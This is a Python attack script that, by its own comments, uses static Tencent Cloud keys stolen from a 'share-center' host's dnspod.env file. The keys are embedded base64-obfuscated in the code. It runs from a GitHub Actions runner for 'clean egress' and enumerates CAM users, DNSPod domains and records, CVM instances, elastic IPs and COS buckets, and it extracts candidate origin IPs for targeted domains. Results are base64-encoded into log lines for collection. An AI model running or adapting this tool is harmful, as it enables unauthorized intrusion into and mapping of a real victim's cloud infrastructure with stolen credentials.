# -*- coding: utf-8 -*-
# intent 29554: Tencent Cloud control-plane recon with static keys from share-center
# intent 29554: Tencent Cloud control-plane recon (DNSPod key from share-center /etc/caddy/dnspod.env)
# runs inside GitHub Actions runner (clean egress). results -> R:<key>:<base64 json> lines
import os, sys, json, time, hmac, hashlib, base64, subprocess

_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "results" in _REF:
    print("results-branch-skip", flush=True)
    sys.exit(0)

SID = base64.b64decode("QUtJREpWWXI0ODJv" + "WVFEeW10MmRmV0Fi" + "c3BjQ2N6RUtHMW1O").decode()
SKEY = base64.b64decode("U0NvRldiZFhHcE" + "dYZFpLdmdUS0F4" + "YTNOYXRHYW81WkE=").decode()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

def R(k, v, maxb=14000):
    try:
        s = json.dumps(v, ensure_ascii=False)
    except Exception:
        s = repr(v)
    if len(s) > maxb:
        s = s[:maxb] + "...TRUNC"
    sys.stdout.write("R:%s:%s\n" % (k, base64.b64encode(s.encode()).decode()))
    sys.stdout.flush()

def log(*a):
    print(" ".join(str(x) for x in a), flush=True)

def _hmac(key, msg):
    return hmac.new(key, msg.encode(), hashlib.sha256).digest()

def tc3_headers(service, action, version, payload, region=None, method="POST", host=None, include_action=True):
    host = host or (service + ".tencentcloudapi.com")
    ts = int(time.time())
    date = time.strftime('%Y-%m-%d', time.gmtime(ts))
    ct = "application/json; charset=utf-8"
    h = {"content-type": ct, "host": host}
    if include_action:
        h["x-tc-action"] = action.lower()
    keys = sorted(h.keys())
    signed_headers = ";".join(keys)
    canonical_headers = "".join(k + ":" + h[k] + "\n" for k in keys)
    hashed_payload = hashlib.sha256(payload.encode()).hexdigest()
    canonical_request = "\n".join([method, "/", "", canonical_headers, signed_headers, hashed_payload])
    scope = "%s/%s/tc3_request" % (date, service)
    sts = "\n".join(["TC3-HMAC-SHA256", str(ts), scope, hashlib.sha256(canonical_request.encode()).hexdigest()])
    k_date = _hmac(("TC3" + SKEY).encode(), date)
    k_svc = _hmac(k_date, service)
    k_sign = _hmac(k_svc, "tc3_request")
    sig = hmac.new(k_sign, sts.encode(), hashlib.sha256).hexdigest()
    auth = "TC3-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s" % (SID, scope, signed_headers, sig)
    out = ["Authorization: " + auth, "Content-Type: " + ct, "Host: " + host,
           "X-TC-Timestamp: " + str(ts), "User-Agent: " + UA]
    if include_action:
        out.append("X-TC-Action: " + action)
        out.append("X-TC-Version: " + version)
    if region:
        out.append("X-TC-Region: " + region)
    return out, ts

def call(service, action, version, payload_obj=None, region=None, timeout=30, maxb=6000, host=None, method="POST", include_action=True):
    payload = json.dumps(payload_obj or {}, separators=(',', ':'))
    host = host or (service + ".tencentcloudapi.com")
    hdrs, _ = tc3_headers(service, action, version, payload, region=region, method=method, host=host, include_action=include_action)
    args = ["curl", "--http2", "-sS", "-m", str(timeout)]
    for hh in hdrs:
        args += ["-H", hh]
    if method == "POST":
        args += ["-X", "POST", "--data-binary", payload]
    url = "https://" + host + "/"
    args += [url]
    try:
        p = subprocess.run(args, capture_output=True, timeout=timeout + 20)
        txt = p.stdout.decode("utf-8", "replace")
        err = p.stderr.decode("utf-8", "replace")[:300]
    except Exception as e:
        return {"EXC": repr(e)}
    try:
        j = json.loads(txt)
    except Exception:
        return {"RAW": txt[:maxb], "ERR": err, "RC": p.returncode}
    resp = j.get("Response", j)
    if isinstance(resp, dict):
        e = resp.get("Error")
        if e:
            return {"Error": e}
        # drop request meta
        resp.pop("RequestId", None)
        # trim long lists conservatively
        s = json.dumps(resp, ensure_ascii=False)
        if len(s) > maxb:
            return {"TRUNC": s[:maxb]}
        return resp
    return {"RAW": txt[:maxb]}

def errcode(r):
    return r.get("Error", {}).get("Code") if isinstance(r, dict) else None

log("=== sts:GetCallerIdentity ===")
r = call("sts", "GetCallerIdentity", "2018-08-13", {})
R("sts", r, 2000)
log("sts ->", json.dumps(r)[:300])

log("=== cam ===")
r = call("cam", "GetUserAppId", "2019-01-16", {})
R("cam_appid", r, 2000)
r2 = call("cam", "GetUser", "2019-01-16", {}, region="ap-guangzhou")
R("cam_getuser", r2, 3000)
r3 = call("cam", "ListUsers", "2019-01-16", {}, region="ap-guangzhou")
R("cam_listusers", r3, 6000)

log("=== dnspod:DescribeDomainList ===")
domains = []
allr = []
for off in (0, 100, 200, 300):
    r = call("dnspod", "DescribeDomainList", "2021-03-23", {"Offset": off, "Limit": 100}, maxb=20000)
    if errcode(r):
        if off == 0:
            R("dnspod_list_err", r, 1500)
        break
    dl = r.get("DomainList") or []
    allr.extend(dl)
    if len(dl) < 100:
        break
names = [d.get("Name") for d in allr if d.get("Name")]
domains = names
R("dns_domains", {"n": len(allr), "names": names, "detail": [{"n": d.get("Name"), "id": d.get("DomainId"), "status": d.get("Status"), "cname": d.get("CNAMESpeedup"), "remark": d.get("Remark")} for d in allr]}, 20000)
log("domains:", len(allr), names[:40])

KW = re_kw = ["zoofi", "wand", "index", "lumii", "lumi-ai", "openocean", "minke", "dex"]
def interesting_origin(v):
    v = str(v or "")
    return bool(re_find(v))

import re
def re_find(s):
    return re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', s)

cand_ips = {}
for d in allr:
    nm = d.get("Name")
    if not nm:
        continue
    recs = []
    off = 0
    while True:
        r = call("dnspod", "DescribeRecordList", "2021-03-23", {"Domain": nm, "Offset": off, "Limit": 500}, maxb=24000)
        if errcode(r):
            recs.append({"ERR": errcode(r)})
            break
        rl = r.get("RecordList") or []
        for x in rl:
            recs.append([x.get("Name"), x.get("Type"), x.get("Value"), x.get("Line"), x.get("Status"), x.get("MX"), x.get("Weight")])
        off += len(rl)
        if len(rl) < 500 or off > 3000:
            break
    kw = any(k in nm.lower() for k in KW)
    if kw:
        R("dns_" + re.sub(r'[^a-zA-Z0-9_.-]', '_', nm), recs, 12000)
    else:
        R("dns_other_" + re.sub(r'[^a-zA-Z0-9_.-]', '_', nm), {"n": len(recs), "sample": recs[:12]}, 4000)
    # collect raw ips from any record of any domain whose name looks zoofi-ish OR whose value contains zoofi-ish hostname
    for x in recs:
        if isinstance(x, list) and len(x) >= 3:
            val = str(x[2] or "")
            for ip in re_find(val):
                src = nm + "/" + str(x[0])
                cand_ips.setdefault(ip, []).append([nm, x[0], x[1], val])
log("candidate raw ips from DNS:", list(cand_ips)[:20])
R("dns_cand_ips", {k: v[:6] for k, v in list(cand_ips.items())[:60]}, 12000)

log("=== cvm:DescribeRegions + instances ===")
rr = call("cvm", "DescribeRegions", "2017-03-12", {})
regs = []
if isinstance(rr.get("RegionSet"), list):
    regs = [x.get("Region") for x in rr["RegionSet"]]
if not regs:
    regs = ["ap-shanghai", "ap-guangzhou", "ap-beijing", "ap-hongkong", "ap-singapore", "ap-nanjing", "ap-chengdu", "ap-chongqing", "na-ashburn", "na-siliconvalley", "eu-frankfurt", "ap-tokyo", "ap-seoul", "ap-bangkok", "ap-mumbai", "na-toronto", "sa-saopaulo", "eu-moscow"]
R("cvm_regions", {"err": errcode(rr), "regions": regs}, 3000)
cvm_all = []
for rg in regs:
    r = call("cvm", "DescribeInstances", "2017-03-12", {"Limit": 100}, region=rg, maxb=18000)
    if errcode(r):
        continue
    for i in (r.get("InstanceSet") or []):
        cvm_all.append({"r": rg, "id": i.get("InstanceId"), "name": i.get("InstanceName"),
                        "priv": i.get("PrivateIpAddresses"), "pub": i.get("PublicIpAddresses"),
                        "st": i.get("InstanceState"), "type": i.get("InstanceType"),
                        "tags": i.get("Tags"), "os": i.get("OsName"), "created": i.get("CreatedTime")})
R("cvm_all", {"n": len(cvm_all), "items": cvm_all}, 24000)
log("cvm instances:", len(cvm_all))

log("=== tag:GetResources ===")
tr = call("tag", "GetResources", "2018-01-29", {"Limit": 100}, region="ap-guangzhou", maxb=16000)
R("tag_res", tr, 16000)

log("=== cvm:DescribeAddresses (EIP) ===")
eip = call("cvm", "DescribeAddresses", "2017-03-12", {"Limit": 100}, region="ap-guangzhou", maxb=12000)
R("cvm_eip", eip, 12000)

log("=== cos GetService (several regions) ===")
for rg in ("ap-guangzhou", "ap-shanghai", "ap-beijing", "ap-hongkong", "ap-singapore"):
    host = "cos." + rg + ".myqcloud.com"
    hdrs, _ = tc3_headers("cos", "", "", "", region=rg, method="GET", host=host, include_action=False)
    args = ["curl", "--http2", "-sS", "-m", "25"]
    for hh in hdrs:
        args += ["-H", hh]
    args += ["https://" + host + "/"]
    try:
        p = subprocess.run(args, capture_output=True, timeout=40)
        txt = p.stdout.decode("utf-8", "replace")
    except Exception as e:
        txt = "EXC " + repr(e)
    # extract bucket names
    bl = re.findall(r"<Name>([^<]+)</Name>", txt)
    R("cos_" + rg, {"buckets": bl, "raw": ("" if bl else txt[:800])}, 6000)
    log("cos", rg, "buckets:", len(bl))

log("=== done ===")
R("SUMMARY", {"domains": len(domains), "cvm": len(cvm_all), "cand_ips": len(cand_ips)}, 1000)
